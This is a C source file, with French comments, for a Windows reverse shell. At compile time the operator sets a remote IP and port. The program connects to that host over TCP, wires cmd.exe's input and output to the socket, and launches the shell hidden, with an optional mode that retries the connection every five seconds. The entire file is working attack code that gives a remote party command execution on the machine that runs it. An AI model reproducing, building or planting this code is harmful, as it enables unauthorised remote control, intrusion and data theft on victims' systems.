#include <winsock2.h>
#include <windows.h>
#include <io.h>
#include <process.h>
#include <sys/types.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

/* ================================================== */
/* |     CHANGE THIS TO THE CLIENT IP AND PORT      | */
/* ================================================== */
/*
 * Il faut définir l'IP et le port du serveur distant au moment de la compilation.
 * Exemple : -DCLIENT_IP=\"192.168.1.10\" -DCLIENT_PORT=4444
 */
#if !defined(CLIENT_IP) || !defined(CLIENT_PORT)
# define CLIENT_IP (char*)"0.0.0.0"
# define CLIENT_PORT (int)0
#endif
/* ================================================== */

/*
 * Programme principal.
 *
 * On vérifie que la cible est bien configurée, on initialise Winsock,
 * on se connecte au serveur, puis on lance cmd.exe en redirigeant son
 * STDIN/STDOUT/STDERR vers le socket.
 */
int main(void) {
	/*
	 * Si l'IP reste à 0.0.0.0 ou si le port vaut 0, on stoppe directement.
	 */
	if (strcmp(CLIENT_IP, "0.0.0.0") == 0 || CLIENT_PORT == 0) {
		write(2, "[ERROR] CLIENT_IP and/or CLIENT_PORT not defined.\n", 50);
		return (1);
	}

	/*
	 * Initialisation de Winsock pour utiliser les sockets Windows.
	 */
	WSADATA wsaData;
	if (WSAStartup(MAKEWORD(2 ,2), &wsaData) != 0) {
		write(2, "[ERROR] WSASturtup failed.\n", 27);
		return (1);
	}

	/*
	 * On prépare l'adresse du serveur distant.
	 * AF_INET = IPv4, SOCK_STREAM = TCP.
	 */
	int port = CLIENT_PORT;
	struct sockaddr_in sa;
	SOCKET sockt = WSASocketA(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);
	sa.sin_family = AF_INET;
	sa.sin_port = htons(port);
	sa.sin_addr.s_addr = inet_addr(CLIENT_IP);

	/*
	 * Connexion au serveur distant.
	 *
	 * Si WAIT_FOR_CLIENT est défini, on retente jusqu'à la réussite.
	 * Sinon, on tente une seule connexion puis on quitte en cas d'échec.
	 */
#ifdef WAIT_FOR_CLIENT
	while (connect(sockt, (struct sockaddr *) &sa, sizeof(sa)) != 0) {
		Sleep(5000);
	}
#else
	if (connect(sockt, (struct sockaddr *) &sa, sizeof(sa)) != 0) {
		write(2, "[ERROR] connect failed.\n", 24);
		return (1);
	}
#endif

	/*
	 * On crée le shell Windows et on redirige ses flux d'entrée/sortie
	 * vers le socket pour qu'il soit contrôlé par le serveur distant.
	 */
	STARTUPINFO sinfo;
	memset(&sinfo, 0, sizeof(sinfo));
	sinfo.cb = sizeof(sinfo);
	sinfo.dwFlags = (STARTF_USESTDHANDLES);
	sinfo.hStdInput = (HANDLE)sockt;
	sinfo.hStdOutput = (HANDLE)sockt;
	sinfo.hStdError = (HANDLE)sockt;
	PROCESS_INFORMATION pinfo;

	/*
	 * On lance cmd.exe. Le shell va lire les commandes depuis le socket
	 * et envoyer la sortie vers le même socket.
	 */
	CreateProcessA(NULL, "cmd", NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &sinfo, &pinfo);

	return (0);
}